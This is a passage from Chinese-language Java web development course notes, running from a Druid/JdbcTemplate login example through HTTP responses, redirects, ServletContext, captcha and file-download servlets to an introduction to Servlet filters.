//2.初始化连接池对象                    ds = DruidDataSourceFactory.createDataSource(pro);                        &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125; catch (Exception e) &#123;                    e.printStackTrace();                &#125;            &#125;                    /**             * 获取连接池对象             */            public static DataSource getDataSource()&#123;                return ds;            &#125;</code></pre><p>​            </p><pre><code>            /**             * 获取连接Connection对象             */            public static Connection getConnection() throws SQLException &#123;                return  ds.getConnection();            &#125;        &#125;    5. 创建包cn.itcast.dao,创建类UserDao,提供login方法                package cn.itcast.dao;        import cn.itcast.domain.User;        import cn.itcast.util.JDBCUtils;        import org.springframework.dao.DataAccessException;        import org.springframework.jdbc.core.BeanPropertyRowMapper;        import org.springframework.jdbc.core.JdbcTemplate;                /**         * 操作数据库中User表的类         */        public class UserDao &#123;                    //声明JDBCTemplate对象共用            private JdbcTemplate template = new JdbcTemplate(JDBCUtils.getDataSource());                    /**             * 登录方法             * @param loginUser 只有用户名和密码             * @return user包含用户全部数据,没有查询到，返回null             */            public User login(User loginUser)&#123;                try &#123;                    //1.编写sql                    String sql = &quot;select * from user where username = ? and password = ?&quot;;                    //2.调用query方法                    User user = template.queryForObject(sql,                            new BeanPropertyRowMapper&lt;User&gt;(User.class),                            loginUser.getUsername(), loginUser.getPassword());</code></pre><p>​            </p><pre><code>                    return user;                &#125; catch (DataAccessException e) &#123;                    e.printStackTrace();//记录日志                    return null;                &#125;            &#125;        &#125;        6. 编写cn.itcast.web.servlet.LoginServlet类        package cn.itcast.web.servlet;        import cn.itcast.dao.UserDao;        import cn.itcast.domain.User;                import javax.servlet.ServletException;        import javax.servlet.annotation.WebServlet;        import javax.servlet.http.HttpServlet;        import javax.servlet.http.HttpServletRequest;        import javax.servlet.http.HttpServletResponse;        import java.io.IOException;        @WebServlet(&quot;/loginServlet&quot;)        public class LoginServlet extends HttpServlet </code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1.设置编码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取请求参数</span></span><br><span class="line">        String username = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password = req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="comment">//3.封装user对象</span></span><br><span class="line">        User loginUser = <span class="keyword">new</span> User();</span><br><span class="line">        loginUser.setUsername(username);</span><br><span class="line">        loginUser.setPassword(password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.调用UserDao的login方法</span></span><br><span class="line">        UserDao dao = <span class="keyword">new</span> UserDao();</span><br><span class="line">        User user = dao.login(loginUser);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.判断user</span></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//登录失败</span></span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;/failServlet&quot;</span>).forward(req,resp);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//登录成功</span></span><br><span class="line">            <span class="comment">//存储数据</span></span><br><span class="line">            req.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            <span class="comment">//转发</span></span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;/successServlet&quot;</span>).forward(req,resp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> 编写FailServlet和SuccessServlet类</span><br><span class="line"><span class="meta">@WebServlet(&quot;/successServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SuccessServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//获取request域中共享的user对象</span></span><br><span class="line">        User user = (User) request.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(user != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//给页面写一句话</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置编码</span></span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">//输出</span></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;登录成功！&quot;</span>+user.getUsername()+<span class="string">&quot;,欢迎您&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure><pre><code>        @WebServlet(&quot;/failServlet&quot;)        public class FailServlet extends HttpServlet &#123;            protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;                //给页面写一句话                        //设置编码                response.setContentType(&quot;text/html;charset=utf-8&quot;);                //输出                response.getWriter().write(&quot;登录失败，用户名或密码错误&quot;);                    &#125;                    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;                this.doPost(request,response);            &#125;        &#125;    8. login.html中form表单的action路径的写法        * 虚拟目录+Servlet的资源路径    9. BeanUtils工具类，简化数据封装        * 用于封装JavaBean的        1. JavaBean：标准的Java类            1. 要求：                1. 类必须被public修饰                2. 必须提供空参的构造器                3. 成员变量必须使用private修饰                4. 提供公共setter和getter方法            2. 功能：封装数据        2. 概念：            成员变量：            属性：setter和getter方法截取后的产物                例如：getUsername() --&gt; Username--&gt; username        3. 方法：            1. setProperty()            2. getProperty()            3. populate(Object obj , Map map):将map集合的键值对信息，封装到对应的JavaBean对象中</code></pre><h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><p>今日内容</p><pre><code>1. HTTP协议：响应消息2. Response对象3. ServletContext对象</code></pre><p> HTTP协议：</p><pre><code>1. 请求消息：客户端发送给服务器端的数据    * 数据格式：        1. 请求行        2. 请求头        3. 请求空行        4. 请求体2. 响应消息：服务器端发送给客户端的数据    * 数据格式：        1. 响应行            1. 组成：协议/版本 响应状态码 状态码描述            2. 响应状态码：服务器告诉客户端浏览器本次请求和响应的一个状态。                1. 状态码都是3位数字                 2. 分类：                    1. 1xx：服务器就收客户端消息，但没有接受完成，等待一段时间后，发送1xx多状态码                    2. 2xx：成功。代表：200                    3. 3xx：重定向。代表：302(重定向)，304(访问缓存)                    4. 4xx：客户端错误。                        * 代表：                            * 404（请求路径没有对应的资源）                             * 405：请求方式没有对应的doXxx方法                    5. 5xx：服务器端错误。代表：500(服务器内部出现异常)</code></pre><p>​                    </p><pre><code>        2. 响应头：            1. 格式：头名称： 值            2. 常见的响应头：                1. Content-Type：服务器告诉客户端本次响应体数据格式以及编码格式                2. Content-disposition：服务器告诉客户端以什么格式打开响应体数据                    * 值：                        * in-line:默认值,在当前页面内打开                        * attachment;filename=xxx：以附件形式打开响应体。文件下载        3. 响应空行        4. 响应体:传输的数据     响应字符串格式        HTTP/1.1 200 OK        Content-Type: text/html;charset=UTF-8        Content-Length: 101        Date: Wed, 06 Jun 2018 07:08:42 GMT        &lt;html&gt;          &lt;head&gt;            &lt;title&gt;$Title$&lt;/title&gt;          &lt;/head&gt;          &lt;body&gt;          hello , response          &lt;/body&gt;        &lt;/html&gt;</code></pre><p>Response对象</p><pre><code>* 功能：设置响应消息    1. 设置响应行        1. 格式：HTTP/1.1 200 ok        2. 设置状态码：setStatus(int sc)     2. 设置响应头：setHeader(String name, String value)             3. 设置响应体：        * 使用步骤：            1. 获取输出流                * 字符输出流：PrintWriter getWriter()                * 字节输出流：ServletOutputStream getOutputStream()            2. 使用输出流，将数据输出到客户端浏览器* 案例：    1. 完成重定向        * 重定向：资源跳转的方式        * 代码实现：            //1. 设置状态码为302            response.setStatus(302);            //2.设置响应头location            response.setHeader(&quot;location&quot;,&quot;/day15/responseDemo2&quot;);            //简单的重定向方法            response.sendRedirect(&quot;/day15/responseDemo2&quot;);        * 重定向的特点:redirect            1. 地址栏发生变化            2. 重定向可以访问其他站点(服务器)的资源            3. 重定向是两次请求。不能使用request对象来共享数据        * 转发的特点：forward            1. 转发地址栏路径不变            2. 转发只能访问当前服务器下的资源            3. 转发是一次请求，可以使用request对象来共享数据                * forward 和  redirect 区别                    * 路径写法：            1. 路径分类                1. 相对路径：通过相对路径不可以确定唯一资源                    * 如：./index.html                    * 不以/开头，以.开头路径                    * 规则：找到当前资源和目标资源之间的相对位置关系                        * ./：当前目录                        * ../:后退一级目录                2. 绝对路径：通过绝对路径可以确定唯一资源                    * 如：http://localhost/day15/responseDemo2        /day15/responseDemo2                    * 以/开头的路径                    * 规则：判断定义的路径是给谁用的？判断请求将来从哪儿发出                        * 给客户端浏览器使用：需要加虚拟目录(项目的访问路径)                            * 建议虚拟目录动态获取：request.getContextPath()                            * &lt;a&gt; , &lt;form&gt; 重定向...                        * 给服务器使用：不需要加虚拟目录                            * 转发路径</code></pre><p>​<br>​                        </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span> 服务器输出字符数据到浏览器</span><br><span class="line">* 步骤：</span><br><span class="line"><span class="number">1.</span> 获取字符输出流</span><br><span class="line"><span class="number">2.</span> 输出数据</span><br><span class="line"></span><br><span class="line">* 注意：</span><br><span class="line">* 乱码问题：</span><br><span class="line"><span class="number">1.</span> PrintWriter pw = response.getWriter();获取的流的默认编码是ISO-<span class="number">8859</span>-<span class="number">1</span></span><br><span class="line"><span class="number">2.</span> 设置该流的默认编码</span><br><span class="line"><span class="number">3.</span> 告诉浏览器响应体使用的编码</span><br><span class="line"></span><br><span class="line"><span class="comment">//简单的形式，设置编码，是在获取流之前设置</span></span><br><span class="line">   response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="number">3.</span> 服务器输出字节数据到浏览器</span><br><span class="line">* 步骤：</span><br><span class="line"><span class="number">1.</span> 获取字节输出流   response.getOutputStream()</span><br><span class="line"><span class="number">2.</span> 输出数据   .write(<span class="string">&quot;hello&quot;</span>,getBytes())</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 验证码</span><br><span class="line"><span class="number">1.</span> 本质：图片</span><br><span class="line"><span class="number">2.</span> 目的：防止恶意表单注册</span><br></pre></td></tr></table></figure><p>ServletContext对象：</p><pre><code>1. 概念：代表整个web应用，可以和程序的容器(服务器)来通信2. 获取：    1. 通过request对象获取        request.getServletContext();    2. 通过HttpServlet获取        this.getServletContext();3. 功能：    1. 获取MIME类型：        * MIME类型:在互联网通信过程中定义的一种文件数据类型            * 格式： 大类型/小类型   text/html        image/jpeg        * 获取：String getMimeType(String file)      2. 域对象：共享数据        1. setAttribute(String name,Object value)        2. getAttribute(String name)        3. removeAttribute(String name)        * ServletContext对象范围：所有用户所有请求的数据  甚至换一个浏览器打开也能访问，用它我们需要谨慎，作用时间长，范围大，数据会一直驻留在服务器里    3. 获取文件的真实(服务器)路径        1. 方法：String getRealPath(String path)               String b = context.getRealPath(&quot;/b.txt&quot;);//web目录下资源访问             System.out.println(b);                String c = context.getRealPath(&quot;/WEB-INF/c.txt&quot;);//WEB-INF目录下的资源访问            System.out.println(c);                String a = context.getRealPath(&quot;/WEB-INF/classes/a.txt&quot;);//src目录下的资源访问            src下的文件会加载到WEB-INF下的classes文件夹中            System.out.println(a);</code></pre><p>案例：</p><pre><code>* 文件下载需求：    1. 页面显示超链接    2. 点击超链接后弹出下载提示框    3. 完成图片文件下载* 分析：    1. 超链接指向的资源如果能够被浏览器解析，则在浏览器中展示，如果不能解析，则弹出下载提示框。不满足需求    2. 任何资源都必须弹出下载提示框    3. 使用响应头设置资源的打开方式：        * content-disposition:attachment;filename=xxx* 步骤：    1. 定义页面，编辑超链接href属性，指向Servlet，传递资源名称filename    2. 定义Servlet        1. 获取文件名称        2. 使用字节输入流加载文件进内存        3. 指定response的响应头： content-disposition:attachment;filename=xxx        4. 将数据写出到response输出流* 问题：    * 中文文件问题        * 解决思路：            1. 获取客户端使用的浏览器版本信息            2. 根据不同的版本信息，设置filename的编码方式不同</code></pre><h4 id="案例：验证码"><a href="#案例：验证码" class="headerlink" title="案例：验证码"></a>案例：验证码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/checkCodeServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckCodeServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> width = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">int</span> height = <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.创建一对象，在内存中图片(验证码图片对象)</span></span><br><span class="line">        BufferedImage image = <span class="keyword">new</span> BufferedImage(width,height,BufferedImage.TYPE_INT_RGB);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.美化图片</span></span><br><span class="line">        <span class="comment">//2.1 填充背景色</span></span><br><span class="line">        Graphics g = image.getGraphics();<span class="comment">//画笔对象</span></span><br><span class="line">        g.setColor(Color.PINK);<span class="comment">//设置画笔颜色</span></span><br><span class="line">        g.fillRect(<span class="number">0</span>,<span class="number">0</span>,width,height);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.2画边框</span></span><br><span class="line">        g.setColor(Color.BLUE);</span><br><span class="line">        g.drawRect(<span class="number">0</span>,<span class="number">0</span>,width - <span class="number">1</span>,height - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String str = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">        <span class="comment">//生成随机角标</span></span><br><span class="line">        Random ran = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = ran.nextInt(str.length());</span><br><span class="line">            <span class="comment">//获取字符</span></span><br><span class="line">            <span class="keyword">char</span> ch = str.charAt(index);<span class="comment">//随机字符</span></span><br><span class="line">            <span class="comment">//2.3写验证码</span></span><br><span class="line">            g.drawString(ch+<span class="string">&quot;&quot;</span>,width/<span class="number">5</span>*i,height/<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.4画干扰线</span></span><br><span class="line">        g.setColor(Color.GREEN);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//随机生成坐标点</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> x1 = ran.nextInt(width);</span><br><span class="line">            <span class="keyword">int</span> x2 = ran.nextInt(width);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> y1 = ran.nextInt(height);</span><br><span class="line">            <span class="keyword">int</span> y2 = ran.nextInt(height);</span><br><span class="line">            g.drawLine(x1,y1,x2,y2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.将图片输出到页面展示</span></span><br><span class="line">        ImageIO.write(image,<span class="string">&quot;jpg&quot;</span>,response.getOutputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="案例：文件下载"><a href="#案例：文件下载" class="headerlink" title="案例：文件下载"></a>案例：文件下载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.download;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.web.utils.DownLoadUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/downloadServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取请求参数，文件名称</span></span><br><span class="line">        String filename = request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        <span class="comment">//2.使用字节输入流加载文件进内存</span></span><br><span class="line">        <span class="comment">//2.1找到文件服务器路径</span></span><br><span class="line">        ServletContext servletContext = <span class="keyword">this</span>.getServletContext();</span><br><span class="line">        String realPath = servletContext.getRealPath(<span class="string">&quot;/img/&quot;</span> + filename);</span><br><span class="line">        <span class="comment">//2.2用字节流关联</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(realPath);</span><br><span class="line">        <span class="comment">//3.设置response的响应头</span></span><br><span class="line">        <span class="comment">//3.1设置响应头类型：content-type</span></span><br><span class="line">        String mimeType = servletContext.getMimeType(filename);<span class="comment">//获取文件的mime类型</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;content-type&quot;</span>,mimeType);</span><br><span class="line">        <span class="comment">//3.2设置响应头打开方式:content-disposition</span></span><br><span class="line">        <span class="comment">//解决中文文件名问题</span></span><br><span class="line">        <span class="comment">//1.获取user-agent请求头、</span></span><br><span class="line">        String agent = request.getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line">        <span class="comment">//2.使用工具类方法编码文件名即可</span></span><br><span class="line">        filename = DownLoadUtils.getFileName(agent, filename);</span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+filename);</span><br><span class="line">        <span class="comment">//4.将输入流的数据写出到输出流中</span></span><br><span class="line">        ServletOutputStream sos = response.getOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((len = fis.read(buff)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            sos.write(buff,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Filter：过滤器"><a href="#Filter：过滤器" class="headerlink" title="Filter：过滤器"></a>Filter：过滤器</h3><pre><code>1. 概念：    * 生活中的过滤器：净水器,空气净化器，土匪、    * web中的过滤器：当访问服务器的资源时，过滤器可以将请求拦截下来，完成一些特殊的功能。    * 过滤器的作用：        * 一般用于完成通用的操作。如：登录验证、统一编码处理、敏感字符过滤...2. 快速入门：    1. 步骤：        1. 定义一个类，实现接口Filter        2. 复写方法        3. 配置拦截路径            1. web.xml            2. 注解    2. 代码：        @WebFilter(&quot;/*&quot;)//访问所有资源之前，都会执行该过滤器        public class FilterDemo1 implements Filter &#123;            @Override            public void init(FilterConfig filterConfig) throws ServletException &#123;                    &#125;                    @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;filterDemo1被执行了....&quot;);</code></pre><p>​            </p><pre><code>                //放行                filterChain.doFilter(servletRequest,servletResponse);                    &#125;                    @Override            public void destroy() &#123;                    &#125;        &#125;3. 过滤器细节：    1. web.xml配置            &lt;filter&gt;            &lt;filter-name&gt;demo1&lt;/filter-name&gt;            &lt;filter-class&gt;cn.itcast.web.filter.FilterDemo1&lt;/filter-class&gt;        &lt;/filter&gt;        &lt;filter-mapping&gt;            &lt;filter-name&gt;demo1&lt;/filter-name&gt;            &lt;!-- 拦截路径 --&gt;            &lt;url-pattern&gt;/*&lt;/url-pattern&gt;        &lt;/filter-mapping&gt;    2. 过滤器执行流程        1. 执行过滤器        2. 执行放行后的资源        3. 回来执行过滤器放行代码下边的代码    3. 过滤器生命周期方法        1. init:在服务器启动后，会创建Filter对象，然后调用init方法。只执行一次。用于加载资源        2. doFilter:每一次请求被拦截资源时，会执行。执行多次        3. destroy:在服务器关闭后，Filter对象被销毁。如果服务器是正常关闭，则会执行destroy方法。只执行一次。用于释放资源    4. 过滤器配置详解        * 拦截路径配置：            1. 具体资源路径： /index.jsp   只有访问index.jsp资源时，过滤器才会被执行            2. 拦截目录： /user/*    访问/user下的所有资源时，过滤器都会被执行            3. 后缀名拦截： *.jsp        访问所有后缀名为jsp资源时，过滤器都会被执行            4. 拦截所有资源：/*        访问所有资源时，过滤器都会被执行        * 拦截方式配置：资源被访问的方式            * 注解配置：                * 设置dispatcherTypes属性                    1. REQUEST：默认值。浏览器直接请求资源                    2. FORWARD：转发访问资源                    3. INCLUDE：包含访问资源                    4. ERROR：错误跳转资源                    5. ASYNC：异步访问资源            * web.xml配置                * 设置&lt;dispatcher&gt;&lt;/dispatcher&gt;标签即可                5. 过滤器链(配置多个过滤器)        * 执行顺序：如果有两个过滤器：过滤器1和过滤器2            1. 过滤器1            2. 过滤器2            3. 资源执行            4. 过滤器2            5. 过滤器1         * 过滤器先后顺序问题：            1. 注解配置：按照类名的字符串比较规则比较，值小的先执行                * 如： AFilter 和 BFilter，AFilter就先执行了。            2. web.xml配置： &lt;filter-mapping&gt;谁定义在上边，谁先执行4. 案例：    1. 案例1_登录验证        * 需求：            1. 访问day17_case案例的资源。验证其是否登录            2. 如果登录了，则直接放行。            3. 如果没有登录，则跳转到登录页面，提示&quot;您尚未登录，请先登录&quot;。</code></pre><p>​    </p><pre><code>    2. 案例2_敏感词汇过滤        * 需求：            1. 对day17_case案例录入的数据进行敏感词汇过滤            2. 敏感词汇参考《敏感词汇.txt》            3. 如果是敏感词汇，替换为 ***         * 分析：            1. 对request对象进行增强。增强获取参数相关方法            2. 放行。传递代理对象        * 增强对象的功能：            * 设计模式：一些通用的解决固定问题的方式            1. 装饰模式      